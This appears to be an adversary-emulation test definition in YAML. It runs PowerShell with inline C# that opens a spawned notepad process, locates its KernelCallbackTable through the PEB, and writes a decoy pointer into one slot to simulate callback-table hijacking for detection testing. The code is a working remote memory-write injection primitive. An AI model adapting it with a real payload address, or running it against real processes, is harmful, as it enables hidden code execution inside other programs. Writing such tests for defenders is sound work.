  - name: T1574.013 - Simulate Remote Process KernelCallbackTable Injection Hook
    description: |
      Simulates adversary manipulation of a spawned child process's KernelCallbackTable by writing a mock pointer into its table structure.
    supported_platforms:
      - windows
    executor:
      name: powershell
      elevation_required: false
      command: |
        $target = Start-Process notepad.exe -PassThru
        Start-Sleep -Seconds 1
        $Source = @"
        using System;
        using System.Runtime.InteropServices;
        public class KCTRemoteInject {
            [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
            [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr handle);
            [DllImport("ntdll.dll")] public static extern int NtQueryInformationProcess(IntPtr h, int c, ref PROCESS_BASIC_INFORMATION p, int l, ref int r);
            [StructLayout(LayoutKind.Sequential)] public struct PROCESS_BASIC_INFORMATION { public IntPtr Reserved1, PebBaseAddress, Reserved2, Reserved3, UniqueProcessId, Reserved4; }
            [DllImport("kernel32.dll")] public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesRead);
            [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);

            public static void Inject(int pid) {
                IntPtr hProcess = OpenProcess(0x0020 | 0x0010 | 0x0400, false, pid);
                if (hProcess == IntPtr.Zero) return;

                PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
                int ret = 0;
                int status = NtQueryInformationProcess(hProcess, 0, ref pbi, Marshal.SizeOf(pbi), ref ret);
                if (status == 0 && pbi.PebBaseAddress != IntPtr.Zero) {
                    IntPtr tablePtrAddr = IntPtr.Add(pbi.PebBaseAddress, 0x58);
                    byte[] tableBuf = new byte[Environment.Is64BitProcess ? 8 : 4];
                    IntPtr readBytes;
                    if (ReadProcessMemory(hProcess, tablePtrAddr, tableBuf, tableBuf.Length, out readBytes)) {
                        IntPtr remoteTable = Environment.Is64BitProcess ? (IntPtr)BitConverter.ToInt64(tableBuf, 0) : (IntPtr)BitConverter.ToInt32(tableBuf, 0);
                        if (remoteTable != IntPtr.Zero) {
                            IntPtr slotAddr = IntPtr.Add(remoteTable, 2 * IntPtr.Size);
                            byte[] decoyBuf = Environment.Is64BitProcess ? BitConverter.GetBytes((long)0x44444444) : BitConverter.GetBytes((int)0x44444444);
                            IntPtr writtenBytes;
                            WriteProcessMemory(hProcess, slotAddr, decoyBuf, decoyBuf.Length, out writtenBytes);
                            Console.WriteLine("[+] Successfully simulated remote KernelCallbackTable slot write.");
                        }
                    }
                }
                CloseHandle(hProcess);
            }
        }
        "@
        Add-Type -TypeDefinition $Source -ErrorAction Stop
        [KCTRemoteInject]::Inject($target.Id)
        Stop-Process -Id $target.Id -Force
      cleanup_command: |
        Write-Host "[+] Remote notepad process terminated; target environment cleaned up."

